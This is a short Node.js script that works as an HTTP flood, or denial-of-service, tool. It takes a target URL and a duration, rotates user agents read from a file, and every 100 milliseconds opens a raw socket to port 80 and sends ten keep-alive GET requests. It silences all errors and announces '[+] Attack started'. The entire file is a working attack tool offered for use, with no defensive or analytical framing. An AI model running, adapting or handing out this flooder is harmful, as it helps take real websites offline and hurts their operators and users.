const fs = require('fs');
const url = require('url');
const net = require('net');
const path = require('path');

if (process.argv.length <= 3) {
	console.log(`Usage: node ${path.basename(__filename)} <url> <time>`);
	process.exit(-1);
}

const target = process.argv[2];
const parsed = url.parse(target);
const host = parsed.host;
const time = parseInt(process.argv[3]) || 60;

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

// Load UAs from ua.txt
let userAgents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"];
try {
	if (fs.existsSync('ua.txt')) {
		const ua = fs.readFileSync('ua.txt', 'utf-8');
		userAgents = ua.split(/[\r\n]+/).filter(s => s.trim().length > 0);
		console.log(`[+] Loaded ${userAgents.length} user agents`);
	}
} catch (e) {}

function randomUA() {
	return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function flood() {
	const s = new net.Socket();
	s.connect(80, host);
	s.setTimeout(10000);
	
	const ua = randomUA();
	const req = `GET ${parsed.path || '/'} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${ua}\r\nConnection: Keep-Alive\r\n\r\n`;
	
	for (let i = 0; i < 10; i++) s.write(req);
	
	s.on('data', () => setTimeout(() => { try { s.destroy(); } catch(e) {} }, 5000));
	s.on('error', () => {});
	s.on('timeout', () => { try { s.destroy(); } catch(e) {} });
}

const interval = setInterval(flood, 100);
setTimeout(() => { clearInterval(interval); process.exit(0); }, time * 1000);

console.log(`[+] Attack started on ${host} for ${time} seconds`);
